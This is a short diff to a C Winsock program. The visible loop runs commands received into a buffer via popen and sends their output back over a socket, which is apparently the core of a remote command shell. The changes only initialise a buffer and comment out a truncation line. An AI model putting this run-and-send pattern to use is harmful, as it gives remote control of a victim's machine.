@@ -13,7 +13,7 @@ int main() {
   char buf[BUF_LEN] = "";
   int res = 0;
   FILE *output;
-  char response[RESPONSE_SZ];
+  char response[RESPONSE_SZ] = "";
 
   // Initialize Winsock and use version 2.2
   WSADATA wsaData;
@@ -40,7 +40,7 @@ int main() {
     output = popen(buf, "r");
 
     while (fgets(response, RESPONSE_SZ, output) != NULL) {
-      response[sizeof(response) -2 ] = 0;
+      //response[sizeof(response) -2 ] = 0;
       send( ConnectSocket, response, RESPONSE_SZ, 0);
     };
 
